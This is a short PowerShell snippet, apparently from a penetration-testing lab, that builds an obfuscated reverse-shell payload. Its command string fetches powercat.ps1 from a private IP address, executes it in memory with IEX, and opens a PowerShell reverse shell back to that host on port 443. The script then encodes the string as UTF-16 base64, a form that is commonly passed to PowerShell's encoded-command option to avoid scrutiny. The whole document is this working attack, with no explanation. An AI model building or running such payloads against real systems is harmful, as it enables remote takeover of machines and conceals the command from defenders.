$Text =  "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.177/powercat.ps1');powercat -c 192.168.45.177 -p 443 -e powershell"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
